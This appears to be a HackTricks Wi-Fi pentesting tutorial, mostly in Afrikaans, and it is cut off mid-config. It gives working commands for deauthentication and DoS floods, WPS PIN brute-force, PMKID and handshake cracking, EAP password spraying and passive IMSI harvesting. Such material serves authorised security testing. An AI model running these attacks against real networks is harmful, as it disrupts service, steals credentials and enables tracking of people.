# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi basiese opdragte
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Gereedskap

### Hijacker & NexMon (Android se interne Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Voer airgeddon met docker uit**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Dit kan Evil Twin-, KARMA- en Known Beacons-aanvalle uitvoer en dan 'n phishing-sjabloon gebruik om die werklike netwerkwagwoord te bekom of sosiale netwerk-aanmeldbewyse vas te vang.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Hierdie tool outomatiseer **WPS/WEP/WPA-PSK** aanvalle. Dit sal outomaties:

- Stel die interface in monitor mode
- Skandeer vir moontlike netwerke - en laat jou toe om die slagoffer(e) te kies
- If WEP - Launch WEP attacks
- If WPA-PSK
- If WPS: Pixie dust attack and the bruteforce attack (wees versigtig — die brute-force attack kan 'n lang tyd neem). Let wel dat dit nie null PIN of database/generated PINs probeer nie.
- Probeer die PMKID van die AP vasvang om dit te kraak
- Probeer om clients van die AP te deauthentiseer om 'n handshake vas te vang
- If PMKID or Handshake, probeer bruteforce gebruik makend van top5000 passwords.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Ontkoppel almal (of 'n spesifieke ESSID/Client)
- Random fake APs -- Verberger netwerke, moontlike crash scanners
- Overload AP -- Probeer om die AP dood te maak (gewoonlik nie baie nuttig nie)
- WIDS -- Speel met die IDS
- TKIP, EAPOL -- Sommige spesifieke aanvalle om sekere APs te DoS
- **Cracking**
- Crack **WEP** (verskeie tools en metodes)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Nuttig om captive portal creds vas te vang en/of LAN-aanvalle uit te voer
- **WPA-PSK** Evil Twin -- Nuttig vir netwerk-aanvalle as jy die password ken
- **WPA-MGT** -- Nuttig om company credentials vas te vang
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Nuttig om captive portal creds vas te vang en/of LAN-aanvalle uit te voer
- **+ WPA** -- Nuttig om WPA handshakes vas te vang

## DOS

### Deauthentication Packets

**Description from** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, 'n algemene metode in Wi-Fi hacking, behels die vervalsing van "management" frames om **forcefully disconnect devices from a network**. Hierdie ongeënkripteerde pakkette mislei clients om te glo dat hulle van die regmatige netwerk afkomstig is, wat aanvallers in staat stel om WPA handshakes te versamel vir kraakdoeleindes of om netwerkverbindinge volgehoue te ontwrig. Hierdie taktiek, ontstellend in sy eenvoud, word wyd gebruik en het beduidende implikasies vir netwerksekuriteit.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 beteken deauthentication
- 1 is die aantal deauths om te stuur (jy kan meer as een stuur indien jy wil); 0 beteken stuur dit voortdurend
- -a 00:14:6C:7E:40:80 is die MAC address van die access point
- -c 00:0F:B5:34:30:30 is die MAC address van die client om te deauthenticate; as dit weggelaat word dan word broadcast deauthentication gestuur (werk nie altyd nie)
- ath0 is die interface naam

### Disassociation Packets

**Disassociation packets**, soortgelyk aan deauthentication packets, is 'n tipe management frame wat in Wi-Fi networks gebruik word. Hierdie packets dien om die verbinding tussen 'n toestel (soos 'n laptop of smartphone) en 'n access point (AP) te verbreek. Die primêre onderskeid tussen disassociation en deauthentication lê in hul gebruiksituasies. Terwyl 'n AP deauthentication packets stuur om rogue devices eksplisiet van die netwerk te verwyder, word disassociation packets tipies gestuur wanneer die AP afgeskakel, herbegin of verskuif word, wat dus die ontkoppeling van alle gekoppelde nodes vereis.

**Hierdie aanval kan uitgevoer word deur mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Meer DOS-aanvalle deur mdk4**

**Sien** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Stuur beacon frames om valse APs aan kliënte te wys. Dit kan soms netwerkskanners en selfs drivers laat crash!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Deur authentication frames na alle toeganklike Access Points (APs) binne bereik te stuur, kan hierdie APs oorlaai word, veral wanneer baie clients betrokke is. Hierdie intense verkeer kan tot stelselonstabiliteit lei, wat veroorsaak dat sommige APs vries of selfs reset.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) kontroleer of 'n SSID korrek onthul word en bevestig die AP se bereik. Hierdie tegniek, gekoppel aan **bruteforcing hidden SSIDs** met of sonder 'n wordlist, help om verborge netwerke te identifiseer en toegang daartoe te kry.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Die stuur van ewekansige of duplikaat-pakkette na verskillende QoS-rye kan Michael Countermeasures op **TKIP APs** aktiveer, wat tot 'n een-minuut AP-afsluiting lei. Hierdie metode is 'n doeltreffende **DoS** (Denial of Service) aanvalstaktiek.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Die oorstroming van 'n AP met EAPOL Start frames skep fake sessions, oorlaai die AP en blokkeer regmatige kliënte. Alternatiewelik veroorsaak die inspuiting van fake EAPOL Logoff messages dat kliënte gedwing ontkoppel word; albei metodes ontwrig netwerkdiens effektief.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Aanvalle op IEEE 802.11s mesh-netwerke**

Verskeie aanvalle op skakelbestuur en routering in mesh-netwerke.

**ATTACK MODE w: WIDS Confusion**

Deur kliënte aan verskeie WDS nodes of vals rogue APs te koppel, kan Intrusion Detection and Prevention Systems gemanipuleer word, wat verwarring en potensiële misbruik van die stelsel veroorsaak.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

'n Packet Fuzzer met verskeie pakketsbronne en 'n omvattende stel modifikatore vir pakketmanipulasie.

### **Airggedon**

_**Airgeddon**_ bied die meeste van die aanvalle wat in die vorige opmerkings voorgestel is:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) vereenvoudig die proses om toestelle met 'n router te koppel, en verbeter die opstelspoed en -gerief vir netwerke versleuteld met **WPA** of **WPA2** Personal. Dit is nie effektief teen die maklik gekompromitteerde WEP-sekuriteit nie. WPS gebruik 'n 8-syfer PIN, gevalideer in twee halfdele, wat dit vatbaar maak vir brute-force-aanvalle weens die beperkte aantal kombinasies (11,000 moontlikhede).

### WPS Bruteforce

Daar is 2 hoofgereedskap om hierdie aksie uit te voer: Reaver en Bully.

- **Reaver** is ontwerp om 'n robuuste en praktiese aanval teen WPS te wees, en is getoets teen 'n wye verskeidenheid toegangspunte en WPS-implementasies.
- **Bully** is 'n **nuwe implementering** van die WPS brute force attack, geskryf in C. Dit het verskeie voordele bo die oorspronklike Reaver-kode: minder dependencies, verbeterde geheue- en CPU-prestasie, korrekte hantering van endianness, en 'n meer robuuste stel opsies.

Die aanval benut die **WPS PIN se kwesbaarheid**, veral die blootstelling van die eerste vier syfers en die laaste syfer se rol as 'n kontrolesom, wat die brute-force aanval vergemaklik. Verdedigings teen brute-force aanvalle, soos **blocking MAC addresses** van aggressiewe aanvallers, vereis egter **MAC address rotation** om die aanval voort te sit.

Sodra die WPS PIN verkry is met gereedskap soos Bully of Reaver, kan die aanvaller die WPA/WPA2 PSK aflei, wat **persistent network access** verseker.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Hierdie verfynde benadering mik op WPS PINs deur bekende kwesbaarhede te benut:

1. **Pre-discovered PINs**: Gebruik 'n databasis van bekende PINs wat gekoppel is aan spesifieke vervaardigers wat geneig is om uniforme WPS PINs te gebruik. Hierdie databasis korreleer die eerste drie oktette van MAC-addresses met waarskynlike PINs vir daardie vervaardigers.
2. **PIN Generation Algorithms**: Benut algoritmes soos ComputePIN en EasyBox, wat WPS PINs bereken gebaseer op die AP se MAC-address. Die Arcadyan algorithm benodig daarby ook 'n device ID, wat 'n ekstra laag tot die PIN-generasieproses toevoeg.

### WPS Pixie Dust attack

**Dominique Bongard** het 'n fout ontdek in sommige Access Points (APs) met betrekking tot die skep van geheime kodes, bekend as **nonces** (**E-S1** en **E-S2**). As hierdie nonces geïdentifiseer kan word, word dit maklik om die AP se WPS PIN te kraak. Die AP openbaar die PIN binne 'n spesiale kode (hash) om te bewys dat dit wettig is en nie 'n vals (rogue) AP nie. Hierdie nonces is in wese die "sleutels" om die "kluis" wat die WPS PIN bevat, oop te sluit. More on this can be found [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

In eenvoudige terme is die probleem dat sommige APs nie ewekansige genoeg sleutels gebruik het om die PIN tydens die koppelingsproses te enkripteer nie. Dit maak die PIN kwesbaar om van buite die netwerk geraden te word (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
As jy nie die toestel na monitor mode wil omskakel nie, of as `reaver` en `bully` probleme ondervind, kan jy [OneShot-C](https://github.com/nikita-yfh/OneShot-C) probeer. Hierdie tool kan 'n Pixie Dust attack uitvoer sonder om na monitor mode te hoef te skakel.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin aanval

Sommige swak ontwerpte stelsels gee selfs toegang met 'n **Null PIN** ('n leë of nie-bestaande PIN), wat nogal ongewoon is. Die hulpmiddel **Reaver** kan hierdie kwesbaarheid toets, in teenstelling met **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Al die voorgestelde WPS-aanvalle kan maklik uitgevoer word met behulp van _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 en 6 laat jou toe om **jou eie PIN** te probeer (as jy een het)
- 7 en 8 voer die **Pixie Dust attack** uit
- 13 laat jou toe om die **NULL PIN** te toets
- 11 en 12 sal **die PINs wat verband hou met die geselekteerde AP uit beskikbare databasisse herinsamel** en **genereer** moontlike **PINs** met behulp van: ComputePIN, EasyBox en opsioneel Arcadyan (aanbeveel, hoekom nie?)
- 9 en 10 sal **elke moontlike PIN** toets

## **WEP**

So gebreek en deesdae ongebruik. Weet net dat _**airgeddon**_ 'n WEP-opsie het met die naam "All-in-One" om hierdie tipe beskerming aan te val. Meer tools bied soortgelyke opsies.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **one single packet** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

Many modern routers add an **optional field** to the **first EAPOL** frame during association, known as `Robust Security Network`. This includes the `PMKID`.

As the original post explains, the **PMKID** is created using known data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Gegewe dat die "PMK Name" konstant is, ken ons die BSSID van die AP en die station, en die `PMK` is identies aan dié van 'n volle 4-way handshake, kan **hashcat** hierdie inligting gebruik om die PSK te kraak en die passphrase te herwin!

Om hierdie inligting te **versamel** en die wagwoord plaaslik te **bruteforce**, kan jy:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **PMKIDs captured** sal in die **console** gewys word en ook **saved** binne \_ **/tmp/attack.pcap**\_\
Nou, skakel die capture om na **hashcat/john** formaat en kraak dit:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Neem asseblief kennis dat die formaat van 'n korrekte hash uit **4 dele** bestaan, soos: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` As jou s'n **slegs** uit **3 dele** bestaan, dan is dit **ongeldig** (die PMKID capture was nie geldig nie).

Let daarop dat `hcxdumptool` **ook handshakes vang** (iets soos dit sal verskyn: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Jy kan die **handshakes** na **hashcat**/**john** formaat **transformeer** met `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Ek het opgemerk dat sommige handshakes captured met hierdie tool nie cracked kon word nie, selfs al is die korrekte password bekend. Ek beveel aan om handshakes ook op die tradisionele manier te capture indien moontlik, of verskeie daarvan met hierdie tool te capture._

### Handshake capture

'n aanval op **WPA/WPA2** netwerke kan uitgevoer word deur 'n **handshake** te capture en te probeer om die **password** **offline** te **crack**. Hierdie proses behels die monitering van die kommunikasie van 'n spesifieke netwerk en die **BSSID** op 'n bepaalde **channel**. Hier is 'n vereenvoudigde gids:

1. Identifiseer die **BSSID**, **channel**, en 'n **connected client** van die teiken-netwerk.
2. Gebruik `airodump-ng` om die netwerkverkeer op die gespesifiseerde **channel** en **BSSID** te moniteer, in die hoop om 'n **handshake** te capture. Die opdrag sal soos volg lyk:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Om die kans om 'n handshake te vang te verhoog, ontkoppel die client kortliks van die network om 'n re-authentication af te dwing. Dit kan gedoen word met die `aireplay-ng` command, wat deauthentication packets na die client stuur:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Let wel dat aangesien die kliënt deauthenticated was, dit kon probeer om aan 'n ander AP te koppel of, in ander gevalle, aan 'n ander network._

Sodra in die `airodump-ng` sekere handshake-inligting verskyn, beteken dit dat die handshake vasgevang is en jy kan ophou luister:

![](<../../images/image (172) (1).png>)

Sodra die handshake vasgevang is, kan jy dit **crack** met `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Kontroleer of daar 'n handshake in die lêer is

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_As hierdie gereedskap 'n onvoltooide handshake van 'n ESSID vind voor die voltooide een, sal dit nie die geldige een opspoor nie._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

In **ondernemings-WiFi-opstellings sal jy verskeie verifikasie-metodes teëkom**, elk wat verskillende sekuriteitsvlakke en bestuursfunksies bied. Wanneer jy gereedskap soos `airodump-ng` gebruik om netwerkverkeer te inspekteer, kan jy identifiseerders vir hierdie verifikasie-tipes opmerk. Sommige algemene metodes sluit in:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Hierdie metode ondersteun hardware tokens en one-time passwords binne EAP-PEAP. Anders as MSCHAPv2, gebruik dit nie 'n peer challenge' nie en stuur passwords in plaintext na die access point, wat 'n risiko vir downgrade-aanvalle inhou.
2. **EAP-MD5 (Message Digest 5)**:
- Betrek die stuur van die MD5 hash van die password vanaf die kliënt. Dit word **nie aanbeveel** nie weens vatbaarheid vir dictionary attacks, gebrek aan server authentication, en die onmoontlikheid om session-specific WEP keys te genereer.
3. **EAP-TLS (Transport Layer Security)**:
- Gebruik beide client-side en server-side certificates vir authentication en kan dinamies user-based en session-based WEP keys genereer om kommunikasie te beveilig.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Verskaf mutual authentication deur 'n encrypted tunnel, sowel as 'n metode om dinamiese, per-user, per-session WEP keys af te lei. Dit vereis slegs server-side certificates, terwyl kliënte credentials gebruik.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Werk soortgelyk aan EAP deur 'n TLS tunnel te skep vir beskermde kommunikasie. Dit maak dit moontlik om die gebruik van swakker authentication protocols bo-op EAP toe te laat as gevolg van die beskerming wat die tunnel bied.
- **PEAP-MSCHAPv2**: Dikwels na verwys as PEAP; dit kombineer die kwesbare MSCHAPv2 challenge/response-meganisme met 'n beskermende TLS tunnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Soortgelyk aan EAP-TLS maar initialiseer 'n TLS tunnel voordat sertifikate uitgewissel word, wat 'n addisionele laag sekuriteit bied.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Gebruikersnaamvaslegging

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) dit blyk dat as jy **EAP** gebruik die **"Identity"** **messages** moet **supported** wees, en die **username** gaan in **plainteks** gestuur word in die **"Response Identity"** messages.

Selfs by die gebruik van een van die veiligste authentication methods: **PEAP-EAP-TLS**, is dit moontlik om die **username wat in die EAP-protokol gestuur word** te **capture**. Om dit te doen, **capture 'n authentication communication** (start `airodump-ng` binne 'n kanaal en `wireshark` op dieselfde interface) en filter die pakkette deur `eapol`.\
Inside the "**Response, Identity**" packet, die **username** van die kliënt sal verskyn.

![](<../../images/image (850).png>)

### Anonieme identiteite

Identity hiding word ondersteun deur beide EAP-PEAP en EAP-TTLS. In die konteks van 'n WiFi-netwerk word 'n EAP-Identity request gewoonlik deur die access point (AP) geïnitieer tydens die association-proses. Om die beskerming van gebruikersanoniemiteit te verseker, bevat die response van die EAP-kliënt op die gebruiker se toestel slegs die essentiële inligting wat benodig word vir die initial RADIUS-server om die versoek te verwerk. Hierdie konsep word deur die volgende scenario's geïllustreer:

- EAP-Identity = anonymous
- In hierdie scenario gebruik alle gebruikers die pseudonieme "anonymous" as hul gebruikersidentifiseerder. Die initial RADIUS-server funksioneer as óf 'n EAP-PEAP óf EAP-TTLS server, verantwoordelik vir die bestuur van die server-side van die PEAP of TTLS-protokol. Die inner (protected) authentication method word dan óf plaaslik hanteer óf gedelegeer na 'n remote (home) RADIUS-server.
- EAP-Identity = anonymous@realm_x
- In hierdie situasie verdoesel gebruikers van verskillende realms hul identiteite terwyl hulle hul onderskeie realms aandui. Dit laat die initial RADIUS-server toe om die EAP-PEAP of EAP-TTLS versoeke te proxy na RADIUS-servers in hul home realms, wat as die PEAP of TTLS server optree. Die initial RADIUS-server funksioneer uitsluitlik as 'n RADIUS relay node.
- Alternatiewelik kan die initial RADIUS-server funksioneer as die EAP-PEAP of EAP-TTLS server en óf die protected authentication method hanteer óf dit na 'n ander server deurstuur. Hierdie opsie fasiliteer die konfigurasie van verskillende beleide vir verskeie realms.

In EAP-PEAP, sodra die TLS tunnel tussen die PEAP server en die PEAP kliënt gevestig is, inisieer die PEAP server 'n EAP-Identity request en stuur dit deur die TLS tunnel. Die kliënt reageer op hierdie tweede EAP-Identity request deur 'n EAP-Identity response te stuur wat die gebruiker se ware identiteit deur die encrypted tunnel bevat. Hierdie benadering voorkom effektief dat die gebruiker se werklike identiteit aan enigiemand wat die 802.11-verkeer afluister onthul word.

EAP-TTLS volg 'n effens ander prosedure. Met EAP-TTLS autentiseer die kliënt gewoonlik deur PAP of CHAP, beveilig deur die TLS tunnel. In hierdie geval sluit die kliënt 'n User-Name attribute en óf 'n Password óf CHAP-Password attribute in die initial TLS-bericht in wat na tunneling gestuur word.

Ongeag die gekose protokol, bekom die PEAP/TTLS server kennis van die gebruiker se ware identiteit nadat die TLS tunnel gevestig is. Die ware identiteit kan voorgestel word as user@realm of eenvoudig user. As die PEAP/TTLS server ook verantwoordelik is vir die gebruiker se authenticatie, beskik dit nou oor die gebruiker se identiteit en gaan voort met die authentication method wat deur die TLS tunnel beskerm word. Alternatiewelik kan die PEAP/TTLS server 'n nuwe RADIUS versoek na die gebruiker se home RADIUS-server deurstuur. Hierdie nuwe RADIUS-versoek laat die PEAP of TTLS protokollaag weg. In gevalle waar die protected authentication method EAP is, word die inner EAP-boodskappe na die home RADIUS-server gestuur sonder die EAP-PEAP of EAP-TTLS wrapper. Die User-Name attribute van die uitgaande RADIUS-bericht bevat die gebruiker se ware identiteit, wat die anonymous User-Name van die inkomende RADIUS-versoek vervang. Wanneer die protected authentication method PAP of CHAP is (slegs deur TTLS ondersteun), word die User-Name en ander authentication attributes wat uit die TLS payload onttrek is, in die uitgaande RADIUS-bericht geplaas, en vervang die anonymous User-Name en TTLS EAP-Message attributes in die inkomende RADIUS-versoek.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notes:
- Werk voordat enige TLS-tunnel as die uitrol bare EAP‑SIM/AKA gebruik sonder beskermde identiteit/pseudonieme.
- Die blootgestelde waarde is 'n permanente identifiseerder gebonde aan die intekenaar se SIM; insameling daarvan stel langtermyn‑opsporing en verdere telekommunikasie‑misbruik in staat.

Impact
- Privaatheid: volgehoue opsporing van gebruikers/toestelle deur passiewe Wi‑Fi‑opnames in openbare plekke.
- Telekommunikasie‑misbruik: met die IMSI kan 'n aanvaller met SS7/Diameter‑toegang ligging opvra of probeer oproepe/SMS afvang en MFA steel.

Mitigations / what to look for
- Verifieer dat kliënte anonieme outer identities (pseudonieme) vir EAP‑SIM/AKA gebruik soos per 3GPP‑riglyne (bv. 3GPP TS 33.402).
- Voorkeur is om die identity phase te tunnel (bv. EAP‑TTLS/PEAP wat inner EAP‑SIM/AKA dra) sodat die IMSI nooit in duidelike teks gestuur word nie.
- Packet captures van association/auth mag nooit 'n rou IMSI in EAP-Response/Identity openbaar nie.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** a **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Jy kan hierdie aanval ook met `eaphammer` uitvoer:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Kliëntaanvalle Teorie

### Netwerkkeuse en Roaming

- Die 802.11-protokol definieer hoe 'n stasie by 'n Extended Service Set (ESS) aansluit maar spesifiseer nie die kriteria vir die keuse van 'n ESS of 'n access point (AP) binne dit nie.
- Stasies kan tussen APs wat dieselfde ESSID deel roam, en sodoende konneksie regdeur 'n gebou of area behou.
- Die protokol vereis stasie-outentisering teen die ESS, maar vereis nie dat die AP aan die stasie outentiseer nie.

### Voorkeur Netwerklys (PNL)

- Stasies stoor die ESSID van elke draadlose netwerk waarmee hulle koppel in hul Voorkeur Netwerklys (PNL), saam met netwerk-spesifieke konfigurasie-parameters.
- Die PNL word gebruik om outomaties met bekende netwerke te koppel, wat die gebruikerservaring verbeter deur die koppelproses te stroomlyn.

### Passiewe Skandering

- APs stuur periodiek beacon-frames uit wat hul teenwoordigheid en eienskappe aankondig, insluitend die AP se ESSID tensy uitsending gedeaktiveer is.
- Tydens passiewe skandering luister stasies na beacon-frames. As die ESSID van 'n beacon ooreenstem met 'n inskrywing in die stasie se PNL, kan die stasie outomaties met daardie AP verbind.
- Kennis van 'n toestel se PNL maak potensiële uitbuiting moontlik deur die ESSID van 'n bekende netwerk na te boots en die toestel te mislei om met 'n rogue AP te koppel.

### Aktiewe Probing

- Aktiewe probing behels dat stasies probe requests stuur om na nabygeleë APs en hul eienskappe te soek.
- Gerigte probe requests is gemik op 'n spesifieke ESSID en help om te bepaal of 'n bepaalde netwerk binne bereik is, selfs al is dit 'n verborgen netwerk.
- Uitsaai probe requests het 'n null SSID-veld en word aan alle nabygeleë APs gestuur, wat die stasie toelaat om vir enige voorkeurnetwerk te kyk sonder om die inhoud van sy PNL bekend te maak.

## Eenvoudige AP met herleiding na Internet

Voordat verduidelik word hoe om meer komplekse aanvalle uit te voer, gaan verduidelik word **hoe** om net **'n** **AP** te **skep** en **sy** **verkeer** na 'n koppelvlak wat met die **Internet** verbind is **na** **herlei**.

Gebruik `ifconfig -a` om te kontroleer dat die wlan-koppelvlak wat die AP gaan skep en die koppelvlak wat met die Internet verbind is, teenwoordig is.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Skep die konfigurasielêer `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
